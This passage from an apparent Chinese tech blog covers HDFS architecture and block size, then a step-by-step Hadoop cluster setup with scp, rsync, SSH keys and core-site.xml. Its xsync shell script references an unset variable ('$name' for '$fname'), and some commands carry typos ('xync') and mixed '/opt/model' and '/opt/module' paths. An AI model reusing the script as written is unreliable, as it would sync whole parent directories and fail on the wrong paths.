        <content type="html"><![CDATA[<h1 id="一：HDFS-产出背景及定义"><a href="#一：HDFS-产出背景及定义" class="headerlink" title="一：HDFS 产出背景及定义"></a>一：HDFS 产出背景及定义</h1><h2 id="1-1-HDFS-产生背景"><a href="#1-1-HDFS-产生背景" class="headerlink" title="1.1 HDFS 产生背景"></a>1.1 HDFS 产生背景</h2><p>随着数据量越来越大，在一个操作系统存不下所有的数据，那么就分配到更多的操作系 统管理的磁盘中，但是不方便管理和维护，<code>迫切需要一种系统来管理多台机器上的文件</code>，这 就是分布式文件管理系统。<code>HDFS 只是分布式文件管理系统中的一种。</code></p><h2 id="1-2-HDFS-定义"><a href="#1-2-HDFS-定义" class="headerlink" title="1.2 HDFS 定义"></a>1.2 HDFS 定义</h2><p>HDFS（Hadoop Distributed File System），它是一个文件系统，用于存储文件，通过目 录树来定位文件；其次，它是分布式的，由很多服务器联合起来实现其功能，集群中的服务 器有各自的角色。</p><p>HDFS 的使用场景：适合一次写入，多次读出的场景。一个文件经过创建、写入和关闭之后就不需要改变。</p><h1 id="二：HDFS-优缺点"><a href="#二：HDFS-优缺点" class="headerlink" title="二：HDFS 优缺点"></a>二：HDFS 优缺点</h1><h2 id="2-1-HDFS优点"><a href="#2-1-HDFS优点" class="headerlink" title="2.1 HDFS优点"></a>2.1 HDFS优点</h2><h3 id="（1）高容错性"><a href="#（1）高容错性" class="headerlink" title="（1）高容错性"></a>（1）高容错性</h3><ul><li>数据自动保存多个副本。它通过增加副本的形式，提高容错性。</li><li><img src="/blog/5e263552.html/image-20221214165254472.png"></li><li>某一个副本丢失以后，它可以自动恢复。</li><li><img src="/blog/5e263552.html/image-20221214165308416.png"></li></ul><h3 id="（2）适合处理大数据"><a href="#（2）适合处理大数据" class="headerlink" title="（2）适合处理大数据"></a>（2）适合处理大数据</h3><ul><li>数据规模：能够处理数据规模达到GB、TB、甚至PB级别的数据；</li><li>文件规模：能够处理百万规模以上的文件数量，数量相当之大。</li></ul><h3 id="（3）经济因素"><a href="#（3）经济因素" class="headerlink" title="（3）经济因素"></a>（3）经济因素</h3><ul><li>可构建在廉价机器上，通过多副本机制，提高可靠性。</li></ul><h2 id="2-2-HDFS缺点"><a href="#2-2-HDFS缺点" class="headerlink" title="2.2 HDFS缺点"></a>2.2 HDFS缺点</h2><h3 id="（1）不适合低延时数据访问"><a href="#（1）不适合低延时数据访问" class="headerlink" title="（1）不适合低延时数据访问"></a>（1）不适合低延时数据访问</h3><ul><li>比如毫秒级的存储数据，是做不到的。</li></ul><h3 id="（2）无法高效的对大量小文件进行存储"><a href="#（2）无法高效的对大量小文件进行存储" class="headerlink" title="（2）无法高效的对大量小文件进行存储"></a>（2）无法高效的对大量小文件进行存储</h3><ul><li>存储大量小文件的话，它会占用NameNode大量的内存来存储文件目录和 块信息。这样是不可取的，因为NameNode的内存总是有限的；</li><li>小文件存储的寻址时间会超过读取时间，它违反了HDFS的设计目标。</li></ul><h3 id="（3）不支持并发写入、文件随机修改"><a href="#（3）不支持并发写入、文件随机修改" class="headerlink" title="（3）不支持并发写入、文件随机修改"></a>（3）不支持并发写入、文件随机修改</h3><ul><li>一个文件只能有一个写，不允许多个线程同时写；</li><li>仅支持数据append（追加），不支持文件的随机修改。</li></ul><p><img src="/blog/5e263552.html/image-20221214165536477.png"></p><h1 id="三：HDFS-组成架构"><a href="#三：HDFS-组成架构" class="headerlink" title="三：HDFS 组成架构"></a>三：HDFS 组成架构</h1><h2 id="3-1-官方详解"><a href="#3-1-官方详解" class="headerlink" title="3.1 官方详解"></a>3.1 官方详解</h2><p><a href="https://hadoop.apache.org/docs/stable/hadoop-project-dist/hadoop-hdfs/HdfsDesign.html">Apache Hadoop 3.3.4 – HDFS Architecture</a></p><p><img src="/blog/5e263552.html/image-20221214165844098.png"></p><h2 id="3-2-NameNode"><a href="#3-2-NameNode" class="headerlink" title="3.2 NameNode"></a>3.2 NameNode</h2><ul><li>NameNode（nn）：就是Master，它 是一个主管、管理者。<ul><li>管理HDFS的名称空间；</li><li>配置副本策略；</li><li>管理数据块（Block）映射信息；</li><li>处理客户端读写请求。</li></ul></li></ul><h2 id="3-3-DataNode"><a href="#3-3-DataNode" class="headerlink" title="3.3 DataNode"></a>3.3 DataNode</h2><ul><li>DataNode：就是Slave。NameNode 下达命令，DataNode执行实际的操作。<ul><li>存储实际的数据块；</li><li>执行数据块的读&#x2F;写操作。</li></ul></li></ul><h2 id="3-4-Client"><a href="#3-4-Client" class="headerlink" title="3.4 Client"></a>3.4 Client</h2><ul><li>Client：就是客户端。<ul><li>文件切分。文件上传HDFS的时候，Client将文件切分成一个一个的Block，然后进行上传；</li><li>与NameNode交互，获取文件的位置信息；</li><li>与DataNode交互，读取或者写入数据；</li><li>Client提供一些命令来管理HDFS，比如NameNode格式化；</li><li>Client可以通过一些命令来访问HDFS，比如对HDFS增删查改操作；</li></ul></li></ul><h2 id="3-5-Secondary-NameNode"><a href="#3-5-Secondary-NameNode" class="headerlink" title="3.5 Secondary NameNode"></a>3.5 Secondary NameNode</h2><ul><li>Secondary NameNode：并非NameNode的热备。当NameNode挂掉的时候，它并不 能马上替换NameNode并提供服务。<ul><li>辅助NameNode，分担其工作量，比如定期合并Fsimage和Edits，并推送给NameNode ；</li><li>在紧急情况下，可辅助恢复NameNode。</li></ul></li></ul><h1 id="四：HDFS-文件块大小"><a href="#四：HDFS-文件块大小" class="headerlink" title="四：HDFS 文件块大小"></a>四：HDFS 文件块大小</h1><h2 id="4-1-Block-块大小"><a href="#4-1-Block-块大小" class="headerlink" title="4.1 Block 块大小"></a>4.1 Block 块大小</h2><p><img src="/blog/5e263552.html/image-20221214170233975.png"></p><ul><li>由磁盘的传输速率来决定block块大小<ul><li>当使用机械硬盘时，通常为100MB&#x2F;s，由于在计算机中1024为进制单元，故而采用128M；</li><li>当使用固态硬盘时，通常能达到200MB&#x2F;s，因此 block 块大小通常设置为256M；</li></ul></li></ul><h2 id="4-2-为什么块的大小不能设置太小，也不能设置太大？"><a href="#4-2-为什么块的大小不能设置太小，也不能设置太大？" class="headerlink" title="4.2 为什么块的大小不能设置太小，也不能设置太大？"></a>4.2 为什么块的大小不能设置太小，也不能设置太大？</h2><ul><li>HDFS的块设置太小，会增加寻址时间，程序一直在找块的开始位置；</li><li>）如果块设置的太大，从磁盘传输数据的时间会明显大于定位这个块开 始位置所需的时间。导致程序在处理这块数据时，会非常慢。</li><li>HDFS块的大小设置主要取决于磁盘传输速率。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop 运行模式</title>
      <link href="/blog/6ae4aefa.html/"/>
      <url>/blog/6ae4aefa.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：运行模式概述"><a href="#一：运行模式概述" class="headerlink" title="一：运行模式概述"></a>一：运行模式概述</h1><ul><li>Hadoop 官方网站：<a href="http://hadoop.apache.org/">http://hadoop.apache.org/</a></li><li>Hadoop 运行模式包括：本地模式、伪分布式模式以及完全分布式模式。<ul><li>本地模式：单机运行，可以执行官方案例。生产环境不用。</li><li>伪分布式模式：也是单机运行，但是具备 Hadoop 集群的所有功能，一台服务器模 拟一个分布式的环境。生产环境不用。</li><li>完全分布式模式：多台服务器组成分布式环境。生产环境使用。</li></ul></li></ul><h1 id="二：本地运行模式"><a href="#二：本地运行模式" class="headerlink" title="二：本地运行模式"></a>二：本地运行模式</h1><p>演示官方WordCount案例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建目录</span></span><br><span class="line">[root@hadoop100 hadoop-3.3.4]# mkdir wcinput</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建文件</span></span><br><span class="line">[root@hadoop100 wcinput]# vim word.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件内容</span></span><br><span class="line">[root@hadoop100 wcinput]# cat word.txt </span><br><span class="line">ghost ghost</span><br><span class="line">sum moon</span><br><span class="line">hadoop hdfs</span><br><span class="line">mapreduce spark</span><br><span class="line">hdfs hive</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行 wordcount 命令</span></span><br><span class="line">[root@hadoop100 hadoop-3.3.4]# hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.3.4.jar wordcount wcinput/ wcoutput</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看输出文件</span></span><br><span class="line">[root@hadoop100 wcoutput]# ll</span><br><span class="line">总用量 4</span><br><span class="line">-rw-r--r--. 1 root root 64 12月 13 18:48 part-r-00000</span><br><span class="line">-rw-r--r--. 1 root root  0 12月 13 18:48 _SUCCESS</span><br><span class="line">[root@hadoop100 wcoutput]# cat part-r-00000 </span><br><span class="line">ghost2</span><br><span class="line">hadoop1</span><br><span class="line">hdfs2</span><br><span class="line">hive1</span><br><span class="line">mapreduce1</span><br><span class="line">moon1</span><br><span class="line">spark1</span><br><span class="line">sum1</span><br></pre></td></tr></table></figure><h1 id="三：完全分布式模式"><a href="#三：完全分布式模式" class="headerlink" title="三：完全分布式模式"></a>三：完全分布式模式</h1><h2 id="3-1-三台虚拟机准备"><a href="#3-1-三台虚拟机准备" class="headerlink" title="3.1 三台虚拟机准备"></a>3.1 三台虚拟机准备</h2><p>hadoop100、hadoop101、hadoop102</p><p>1）准备 3 台客户机（关闭防火墙、静态 IP、主机名称） </p><p>2）安装 JDK </p><p>3）配置环境变量 </p><p>4）安装 Hadoop </p><p>5）配置环境变量</p><p>6）配置集群</p><p>7）单点启动 </p><p>8）配置 ssh </p><p>9）群起并测试集群</p><h2 id="3-2-编写集群分发脚本-xsync"><a href="#3-2-编写集群分发脚本-xsync" class="headerlink" title="3.2 编写集群分发脚本 xsync"></a>3.2 编写集群分发脚本 xsync</h2><h3 id="3-2-1-scp（secure-copy）安全拷贝"><a href="#3-2-1-scp（secure-copy）安全拷贝" class="headerlink" title="3.2.1 scp（secure copy）安全拷贝"></a>3.2.1 scp（secure copy）安全拷贝</h3><h4 id="（1）scp-定义"><a href="#（1）scp-定义" class="headerlink" title="（1）scp 定义"></a>（1）scp 定义</h4><p>scp 可以实现服务器与服务器之间的数据拷贝。（from server1 to server2）</p><h4 id="（2）基本语法"><a href="#（2）基本语法" class="headerlink" title="（2）基本语法"></a>（2）基本语法</h4><p><img src="/blog/6ae4aefa.html/image-20221213185710855.png"></p><h4 id="（3）案例实操"><a href="#（3）案例实操" class="headerlink" title="（3）案例实操"></a>（3）案例实操</h4><p>前提：在 hadoop100、hadoop101、hadoop102 都已经创建好的&#x2F;opt&#x2F;module、  &#x2F;opt&#x2F;software 两个目录，并且已经把这两个目录修改为 ghost:ghost</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~] # chown ghost:ghost -R /opt/module</span><br><span class="line">[root@hadoop100 ~] # chown ghost:ghost -R /opt/software</span><br></pre></td></tr></table></figure><p>在 hadoop100 上，将 hadoop100 中&#x2F;opt&#x2F;module&#x2F;jdk1.8.0_301 目录拷贝到 hadoop101 上。（推）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 model]$ scp -r /opt/model/jdk1.8.0_301/ ghost@hadoop101:/opt/module/</span><br></pre></td></tr></table></figure><p>在 hadoop101 上，将 hadoop100 中&#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4 目录拷贝到 hadoop101 上。（拉）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop101 ~]$ scp -r ghost@hadoop100:/opt/module/hadoop-3.3.4 /opt/module/</span><br></pre></td></tr></table></figure><p>在hadoop101上，将hadoop100中的&#x2F;opt&#x2F;module 目录下所有目录拷贝到 hadoop102上。（中间人拷贝）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop101 ~]$ scp -r ghost@hadoop100:/opt/module/* ghost@hadoop102:/opt/module/</span><br></pre></td></tr></table></figure><h3 id="3-2-2-rsync-远程同步工具"><a href="#3-2-2-rsync-远程同步工具" class="headerlink" title="3.2.2 rsync 远程同步工具"></a>3.2.2 rsync 远程同步工具</h3><ul><li>rsync 主要用于备份和镜像。具有速度快、避免复制相同内容和支持符号链接的优点。 </li><li>rsync 和 scp 区别：用 rsync 做文件的复制要比 scp 的速度快，rsync 只对差异文件做更 新。scp 是把所有文件都复制过去。</li></ul><h4 id="（1）基本语法"><a href="#（1）基本语法" class="headerlink" title="（1）基本语法"></a>（1）基本语法</h4><p><img src="/blog/6ae4aefa.html/image-20221213192240848.png"></p><h4 id="（2）选项参数说明"><a href="#（2）选项参数说明" class="headerlink" title="（2）选项参数说明"></a>（2）选项参数说明</h4><p><img src="/blog/6ae4aefa.html/image-20221213192345321.png"></p><h4 id="（3）案例实操-1"><a href="#（3）案例实操-1" class="headerlink" title="（3）案例实操"></a>（3）案例实操</h4><p>删除hadoop101中&#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4&#x2F;wcinput</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop101 hadoop-3.3.4]$ rm -rf wcinput/</span><br></pre></td></tr></table></figure><p>同步hadoop100中的&#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4&#x2F; 到 hadoop101</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop101 hadoop-3.3.4]$ rsync -av  ghost@hadoop100:/opt/module/hadoop-3.3.4/ /opt/module/hadoop-3.3.4/</span><br></pre></td></tr></table></figure><h3 id="3-2-3-xsync-集群分发脚本"><a href="#3-2-3-xsync-集群分发脚本" class="headerlink" title="3.2.3 xsync 集群分发脚本"></a>3.2.3 xsync 集群分发脚本</h3><h4 id="（1）需求分析"><a href="#（1）需求分析" class="headerlink" title="（1）需求分析"></a>（1）需求分析</h4><p>需求：循环复制文件到所有节点的相同目录下；</p><p>需求分析：rsync 命令原始拷贝；</p><p>期望脚本：xsync 要同步的文件名称</p><p>期望脚本在任何路径都能使用（脚本放在声明了全局环境变量的路径）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 ~]$ echo $PATH</span><br><span class="line">/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/model/jdk1.8.0_301/bin:/opt/model/hadoop-3.3.4/bin:/opt/model/hadoop-3.3.4/sbin:/home/ghost/.local/bin:/home/ghost/bin</span><br><span class="line">[ghost@hadoop100 ~]$ pwd</span><br><span class="line">/home/ghost</span><br><span class="line">[ghost@hadoop100 ~]$ mkdir bin</span><br></pre></td></tr></table></figure><h4 id="（2）脚本实现"><a href="#（2）脚本实现" class="headerlink" title="（2）脚本实现"></a>（2）脚本实现</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 判断参数个数</span></span><br><span class="line">if [ $# -lt 1 ]</span><br><span class="line">then</span><br><span class="line">        echo 请传入参数！</span><br><span class="line">        exit;</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 遍历集群所有机器</span></span><br><span class="line">for host in hadoop100 hadoop101 hadoop102</span><br><span class="line">do</span><br><span class="line">        echo ====== $host ======</span><br><span class="line"></span><br><span class="line">        # 3. 遍历所有目录，挨个发送</span><br><span class="line">        for file in $@</span><br><span class="line">        do</span><br><span class="line">                # 4.判断文件是否存在</span><br><span class="line">                if [ -e $file ]</span><br><span class="line">                        then</span><br><span class="line">                                # 5.获取父目录</span><br><span class="line">                                pdir=$(cd -P $(dirname $file); pwd)</span><br><span class="line"></span><br><span class="line">                                # 6.获取当前文件名称</span><br><span class="line">                                fname=$(basename $file)</span><br><span class="line">                                ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">                                rsync -av $pdir/$name $host:$pdir</span><br><span class="line">                        else</span><br><span class="line">                                echo $file 文件不存在！</span><br><span class="line">                fi</span><br><span class="line">        done</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="（3）赋权脚本"><a href="#（3）赋权脚本" class="headerlink" title="（3）赋权脚本"></a>（3）赋权脚本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 bin]$ chmod +x xync</span><br></pre></td></tr></table></figure><h4 id="（4）设置全局调用"><a href="#（4）设置全局调用" class="headerlink" title="（4）设置全局调用"></a>（4）设置全局调用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将脚本复制到 /bin 中，以便全局调用</span></span><br><span class="line">[ghost@hadoop100 ~]$ sudo cp xsync /bin/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同步环境变量配置（root所有者）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：如果用了 sudo，那么 xsync 一定要给它的路径补全。</span></span><br><span class="line">[ghost@hadoop100 ~]$ sudo ./bin/xsync /etc/profile.d/ghost_env.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">环境变量生效</span></span><br><span class="line">[ghost@hadoop101 ~]$ source /etc/profile</span><br><span class="line">[ghost@hadoop102 ~]$ source /etc/profile</span><br></pre></td></tr></table></figure><h2 id="3-3-SSH-无密登录配置"><a href="#3-3-SSH-无密登录配置" class="headerlink" title="3.3 SSH 无密登录配置"></a>3.3 SSH 无密登录配置</h2><h3 id="3-3-1-配置-ssh"><a href="#3-3-1-配置-ssh" class="headerlink" title="3.3.1 配置 ssh"></a>3.3.1 配置 ssh</h3><h4 id="（1）基本语法-1"><a href="#（1）基本语法-1" class="headerlink" title="（1）基本语法"></a>（1）基本语法</h4><ul><li>ssh 另一台电脑的 IP 地址</li></ul><h4 id="（2）ssh-连接时出现-Host-key-verification-failed-的解决方法"><a href="#（2）ssh-连接时出现-Host-key-verification-failed-的解决方法" class="headerlink" title="（2）ssh 连接时出现 Host key verification failed 的解决方法"></a>（2）ssh 连接时出现 Host key verification failed 的解决方法</h4><ul><li>Are you sure you want to continue connecting (yes&#x2F;no)?</li><li>输入 yes，并回车</li></ul><h4 id="（3）回到原来主机"><a href="#（3）回到原来主机" class="headerlink" title="（3）回到原来主机"></a>（3）回到原来主机</h4><ul><li>exit</li></ul><h3 id="3-3-2-无密钥配置"><a href="#3-3-2-无密钥配置" class="headerlink" title="3.3.2 无密钥配置"></a>3.3.2 无密钥配置</h3><h4 id="（1）免密登录原理"><a href="#（1）免密登录原理" class="headerlink" title="（1）免密登录原理"></a>（1）免密登录原理</h4><p><img src="/blog/6ae4aefa.html/image-20221214011557358.png"></p><h4 id="（2）生成公钥和私钥"><a href="#（2）生成公钥和私钥" class="headerlink" title="（2）生成公钥和私钥"></a>（2）生成公钥和私钥</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">敲（三个回车），就会生成两个文件 id_rsa（私钥）、id_rsa.pub（公钥）</span></span><br><span class="line">[ghost@hadoop100 .ssh]$ ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">[ghost@hadoop100 .ssh]$ ll</span><br><span class="line">总用量 12</span><br><span class="line">-rw-------. 1 ghost ghost 1679 12月 14 01:17 id_rsa</span><br><span class="line">-rw-r--r--. 1 ghost ghost  397 12月 14 01:17 id_rsa.pub</span><br><span class="line">-rw-r--r--. 1 ghost ghost  555 12月 14 00:59 known_hosts</span><br></pre></td></tr></table></figure><h4 id="（3）讲公钥拷贝到要免密登录的目标机器上"><a href="#（3）讲公钥拷贝到要免密登录的目标机器上" class="headerlink" title="（3）讲公钥拷贝到要免密登录的目标机器上"></a>（3）讲公钥拷贝到要免密登录的目标机器上</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 .ssh]$ ssh-copy-id hadoop100</span><br><span class="line">[ghost@hadoop100 .ssh]$ ssh-copy-id hadoop101</span><br><span class="line">[ghost@hadoop100 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line"></span><br><span class="line">[ghost@hadoop101 .ssh]$ ssh-copy-id hadoop100</span><br><span class="line">[ghost@hadoop101 .ssh]$ ssh-copy-id hadoop101</span><br><span class="line">[ghost@hadoop101 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line"></span><br><span class="line">[ghost@hadoop102 .ssh]$ ssh-copy-id hadoop100</span><br><span class="line">[ghost@hadoop102 .ssh]$ ssh-copy-id hadoop101</span><br><span class="line">[ghost@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此外分别进行登录操作；</span></span><br></pre></td></tr></table></figure><h4 id="（4）-ssh-文件夹下（-x2F-ssh）的文件功能解释"><a href="#（4）-ssh-文件夹下（-x2F-ssh）的文件功能解释" class="headerlink" title="（4）.ssh 文件夹下（~&#x2F;.ssh）的文件功能解释"></a>（4）.ssh 文件夹下（~&#x2F;.ssh）的文件功能解释</h4><p><img src="/blog/6ae4aefa.html/image-20221214012410995.png"></p><h2 id="3-4-集群配置"><a href="#3-4-集群配置" class="headerlink" title="3.4 集群配置"></a>3.4 集群配置</h2><h3 id="3-4-1-集群部署规划"><a href="#3-4-1-集群部署规划" class="headerlink" title="3.4.1 集群部署规划"></a>3.4.1 集群部署规划</h3><ul><li>注意：<ul><li>NameNode 和 SecondaryNameNode 不要安装在同一台服务器</li><li>ResourceManager 也很消耗内存，不要和 NameNode、SecondaryNameNode 配置在 同一台机器上。</li></ul></li></ul><p><img src="/blog/6ae4aefa.html/image-20221214114002383.png"></p><h3 id="3-4-2-配置文件说明"><a href="#3-4-2-配置文件说明" class="headerlink" title="3.4.2 配置文件说明"></a>3.4.2 配置文件说明</h3><ul><li>Hadoop 配置文件分两类：默认配置文件和自定义配置文件</li><li>只有用户想修改某一默认 配置值时，才需要修改自定义配置文件，更改相应属性值。</li></ul><h4 id="（1）默认配置文件"><a href="#（1）默认配置文件" class="headerlink" title="（1）默认配置文件"></a>（1）默认配置文件</h4><p>find &#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4&#x2F; -name core-default.xml</p><table><thead><tr><th align="center">要获取的默认文件</th><th align="center">文件存放在 Hadoop 的 jar 包中的位置</th></tr></thead><tbody><tr><td align="center">[core-default.xml]</td><td align="center">&#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4&#x2F;share&#x2F;doc&#x2F;hadoop&#x2F;hadoop-project-dist&#x2F;hadoop-common&#x2F;core-default.xml</td></tr><tr><td align="center">[hdfs-default.xml]</td><td align="center">&#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4&#x2F;share&#x2F;doc&#x2F;hadoop&#x2F;hadoop-project-dist&#x2F;hadoop-hdfs&#x2F;hdfs-default.xml</td></tr><tr><td align="center">[yarn-default.xml]</td><td align="center">&#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4&#x2F;share&#x2F;doc&#x2F;hadoop&#x2F;hadoop-yarn&#x2F;hadoop-yarn-common&#x2F;yarn-default.xml</td></tr><tr><td align="center">[mapred-default.xml]</td><td align="center">&#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4&#x2F;share&#x2F;doc&#x2F;hadoop&#x2F;hadoop-mapreduce-client&#x2F;hadoop-mapreduce-client-core&#x2F;mapred-default.xml</td></tr></tbody></table><h4 id="（2）自定义配置文件"><a href="#（2）自定义配置文件" class="headerlink" title="（2）自定义配置文件"></a>（2）自定义配置文件</h4><p>core-site.xml、hdfs-site.xml、yarn-site.xml、mapred-site.xml</p><p>四个配置文件存放在 $HADOOP_HOME&#x2F;etc&#x2F;hadoop 这个路径上，用户可以根据项目需求重新进行修改配置。</p><h3 id="3-4-3-配置集群"><a href="#3-4-3-配置集群" class="headerlink" title="3.4.3 配置集群"></a>3.4.3 配置集群</h3><h4 id="（1）核心配置文件"><a href="#（1）核心配置文件" class="headerlink" title="（1）核心配置文件"></a>（1）核心配置文件</h4><p>配置 core-site.xml</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop]$ cd /opt/module/hadoop-3.3.4/etc/hadoop/</span><br><span class="line">[ghost@hadoop100 hadoop]$ vim core-site.xml</span><br></pre></td></tr></table></figure><p>文件内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 指定 NameNode 的地址 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop100:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 指定 hadoop 数据的存储目录 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/module/hadoop-3.3.4/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 配置 HDFS 网页登录使用的静态用户为 ghost --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.http.staticuser.user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>ghost<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="（2）HDFS-配置文件"><a href="#（2）HDFS-配置文件" class="headerlink" title="（2）HDFS 